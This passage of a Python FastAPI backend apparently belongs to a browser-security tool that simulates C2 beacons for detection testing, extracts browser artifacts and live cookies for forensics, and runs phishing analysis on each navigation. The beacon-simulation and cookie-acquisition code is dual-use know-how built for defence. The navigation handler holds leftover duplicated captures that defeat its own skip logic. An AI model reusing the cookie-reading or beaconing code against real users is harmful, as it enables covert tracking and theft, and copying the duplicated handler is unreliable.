    body {{ font-family: system-ui, sans-serif; background:#111827; color:#e5e7eb; padding:24px; }}
    code {{ color:#fbbf24; }}
  </style>
</head>
<body>
  <h1>C3 Test Beacon</h1>
  <p>This page sends a small {method} request every <code>{interval}ms</code>.</p>
  <p>Put this tab in the background to test idle/background beacon detection.</p>
  <pre id="log"></pre>
  <script>
    const log = document.getElementById('log');
    async function tick() {{
      try {{
        // Fixed URL (no cache-busting query string) -- `cache: 'no-store'`
        // already prevents caching. A query string that changes every
        // request (e.g. `?ts=...`) would make this test beacon hit a
        // different "path" on every check-in, which is NOT how real C2
        // beacons behave (they poll one fixed URI) and defeats both the
        // heuristic's "same endpoint" rule and the ML model's URL-diversity
        // feature -- i.e. it would make this demo LESS representative of a
        // real beacon, not more realistic.
        const res = await fetch('/c3/test/beacon-target', {{
          method: '{method}',
          headers: {headers},
          body: {body},
          cache: 'no-store'
        }});
        log.textContent = new Date().toLocaleTimeString() + ' beacon -> ' + res.status + '\\n' + log.textContent;
      }} catch (err) {{
        log.textContent = new Date().toLocaleTimeString() + ' error -> ' + err + '\\n' + log.textContent;
      }}
    }}
    tick();
    setInterval(tick, {interval});
  </script>
</body>
</html>"""


# ══════════════════════════════════════════════════════════════════════════════
#  C4 — Browser Artifact Forensic Correlation Engine
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/forensic/debug")
async def forensic_debug():
    fallback = get_default_profile_path()
    return {
        "component": "C4",
        "playwright_profile_path": PW_PROFILE_DIR,
        "playwright_profile_exists": os.path.isdir(PW_PROFILE_DIR),
        "playwright_session_running": pw_session.is_running,
        "fallback_profile_path": fallback,
        "hint": (
            "C4 scans the Playwright Chromium profile when the session is running. "
            "If databases are locked, stop the session and retry."
        ),
    }


async def _live_cookie_jar():
    """The cookie jar of the running browser, or None when no session is up.

    Chromium keeps an exclusive Windows lock on Network/Cookies for its whole
    lifetime, so a live profile can never be read from the file. Taking the jar
    from the running session is the volatile-acquisition equivalent, and the
    events it produces are labelled as such.
    """
    if not pw_session.is_running:
        return None
    try:
        return await pw_session.context.cookies()
    except Exception:
        return None


@app.post("/forensic/extract")
async def forensic_extract(req: ForensicReq):
    profile_path = req.profile_path
    if not profile_path:
        if pw_session.is_running or os.path.isdir(PW_PROFILE_DIR):
            profile_path = PW_PROFILE_DIR
    live_cookies = await _live_cookie_jar()
    try:
        result = await asyncio.to_thread(run_forensic_analysis, profile_path,
                                         req.save_outputs, live_cookies)
        await _broadcast({"type": "forensic_analysis", "data": get_c4_summary(result)})
        return {"status": "ok", "summary": get_c4_summary(result), "result": result}
    except (FileNotFoundError, ValueError) as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc)) from exc


@app.get("/forensic/report")
async def forensic_report():
    result = get_last_result()
    if not result:
        return {"status": "no_data", "summary": get_c4_summary()}
    return {"status": "ok", "summary": get_c4_summary(result), "result": result}


@app.get("/forensic/summary")
async def forensic_summary():
    return get_c4_summary()


@app.get("/forensic/timeline")
async def forensic_timeline(type: str = "all", flagged: bool = False, limit: int = 300):
    result = get_last_result()
    if not result:
        return {"status": "no_data", "events": []}
    events = result.get("events", [])
    if type != "all":
        events = [e for e in events if e.get("artifact_type") == type]
    if flagged:
        events = [e for e in events if e.get("risk_flag")]
    events = sorted(events, key=lambda e: e.get("timestamp", ""), reverse=True)
    return {"status": "ok", "events": events[:limit]}


@app.get("/forensic/mitre")
async def forensic_mitre():
    result = get_last_result()
    if not result:
        return {"status": "no_data", "findings": []}
    return {"status": "ok",
            "findings": result.get("mitre_result", {}).get("all_findings", [])}


@app.get("/forensic/report/html")
async def forensic_report_html():
    html = render_last_html()
    if not html:
        raise HTTPException(status_code=404, detail="No C4 analysis has been run yet")
    return Response(html, media_type="text/html",
        headers={"Content-Disposition": f"attachment; filename={report_filename('report')}.html"})


@app.get("/forensic/report/json")
async def forensic_report_json():
    data = render_last_json()
    if not data:
        raise HTTPException(status_code=404, detail="No C4 analysis has been run yet")
    return Response(data, media_type="application/json",
        headers={"Content-Disposition": f"attachment; filename={report_filename('report')}.json"})


@app.get("/forensic/report/siem")
async def forensic_report_siem():
    data = render_last_siem()
    if not data:
        raise HTTPException(status_code=404, detail="No C4 analysis has been run yet")
    return Response(data, media_type="application/json",
        headers={"Content-Disposition": f"attachment; filename={report_filename('siem')}.json"})


# ══════════════════════════════════════════════════════════════════════════════
#  Playwright session endpoints (shared by all components)
# ══════════════════════════════════════════════════════════════════════════════

def _needs_full_capture(url: str) -> bool:
    """False when analyze() will short-circuit (SKIP / whitelist / verified) and won't use
    the DOM/screenshot/runtime — lets the nav handler skip costly capture. Mirrors the
    early-return conditions in analyze()."""
    for prefix in ("about:", "chrome:", "devtools:", "electron:"):
        if url.startswith(prefix):
            return False
    u = url.lower()
    for d in settings["whitelist"]:
        if d and d.lower() in u:
            return False
    return not is_verified(url)


async def _pw_nav_handler(url: str, page=None) -> None:
    """C2 phishing analysis on every navigation. C1 runs on click, not navigation."""
    c3_tagger.record_navigation(url)
    dom        = await pw_session.get_dom()
    screenshot = await pw_session.get_screenshot_b64()
    title      = await pw_session.get_title()
    req        = AnalyzeReq(url=url, dom=dom, screenshot=screenshot)
    """C2 phishing analysis on every navigation. C1 runs on click, not navigation.
    Reads from the specific `page` that navigated so each tab is analyzed independently."""
    # Skip the expensive captures for URLs analyze() will short-circuit (skip/whitelist/
    # verified); for the rest, only screenshot when L3 can actually use it.
    if _needs_full_capture(url):
        dom = await pw_session.get_dom(page)
        if _L3_HAS_HASHES and settings.get("layers", {}).get("l3", True):
            screenshot = await pw_session.get_screenshot_b64(page)
        else:
            screenshot = ""
        runtime = await pw_session.get_runtime_signals(
            active_probe=settings.get("runtime_active_probe", False), page=page)
    else:
        dom, screenshot, runtime = "", "", {}
    title      = await pw_session.get_title(page)
    req        = AnalyzeReq(url=url, dom=dom, screenshot=screenshot, runtime=runtime)
    result     = await analyze(req)
    # If the tab was closed while this analysis was in flight, don't emit a stale card.
    if page is not None:
        try:
            if page.is_closed():
                return
        except Exception:
            pass
        result["tab_id"] = pw_session.tab_id(page)
        result["title"]  = title
    await _broadcast({"type": "analysis",   "data": result})
    await _broadcast({"type": "url_change", "url": url, "title": title})

    # Threshold-driven in-browser interstitial (warning / blocking + continue) — on the
    # tab that navigated, so it never leaks onto another tab.
    if settings.get("interstitial_enabled", True):
        score = result.get("risk_score", 0)
        if score >= settings.get("block_threshold", 60):
            await pw_session.inject_interstitial("block", result, page=page)
        elif score >= settings.get("warn_threshold", 30):
            await pw_session.inject_interstitial("warn", result, page=page)


async def _pw_tab_closed(tab_id: int) -> None:
    """Tell the dashboard to drop a tab's live card when its browser tab closes."""
    await _broadcast({"type": "tab_closed", "tab_id": tab_id})


async def _bg_start_session() -> None:
    global _session_starting
    try:
        await pw_session.start()
        # C3 — attach network interceptor and start analysis loop
        await c3_tagger.setup(pw_session.context)
        await c3_interceptor.start(pw_session)
        await c3_analyzer.start_loop(pw_session, _broadcast)
        home = settings.get("pw_home_url", "").strip()
        if home:
            try:
                await pw_session.navigate(home)
            except Exception:
                pass
        url = await pw_session.current_url()
        await _broadcast({"type": "session_started", "url": url})
    except Exception as exc:
        print(f"[Session] Start failed: {exc}")
        await _broadcast({"type": "session_error", "message": str(exc)})
    finally:
        _session_starting = False


@app.get("/session/status")
async def session_status():
    url = await pw_session.current_url() if pw_session.is_running else ""
    return {"running": pw_session.is_running, "url": url}


@app.post("/session/start")
async def session_start():
    global _session_starting
    if pw_session.is_running:
        return {"status": "already_running"}
    if _session_starting:
        return {"status": "starting"}
    _session_starting = True
    pw_session.clear_callbacks()
    pw_session.add_nav_callback(_pw_nav_handler)
    pw_session.add_click_callback(_on_extension_install_click)
    pw_session.add_close_callback(_pw_tab_closed)
    asyncio.create_task(_bg_start_session())
    return {"status": "starting"}


@app.post("/session/stop")
async def session_stop():
    global _session_starting
    _session_starting = False
    # Tear down C3 before closing the browser
    await c3_analyzer.stop_loop()
    await c3_interceptor.stop()
    await pw_session.stop()
    await _broadcast({"type": "session_stopped"})
    return {"status": "stopped"}


@app.post("/session/navigate")
async def session_navigate(req: NavigateReq):
    url = req.url.strip()
    if not url:
        raise HTTPException(status_code=400, detail="url required")
    if not pw_session.is_running and _session_starting:
        for _ in range(20):
            await asyncio.sleep(0.25)
            if pw_session.is_running:
                break
    if not pw_session.is_running:
        raise HTTPException(status_code=400, detail="Playwright session not running")
    return {"url": await pw_session.navigate(url)}


# ══════════════════════════════════════════════════════════════════════════════
#  WebSocket — real-time event stream
# ══════════════════════════════════════════════════════════════════════════════

@app.websocket("/ws/events")
async def ws_events(websocket: WebSocket):
    await websocket.accept()
    _ws_clients.add(websocket)
    await websocket.send_json({
        "type":            "init",
        "session_running": pw_session.is_running,
        "url":             await pw_session.current_url() if pw_session.is_running else "",
    })
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        _ws_clients.discard(websocket)
    except Exception:
        _ws_clients.discard(websocket)
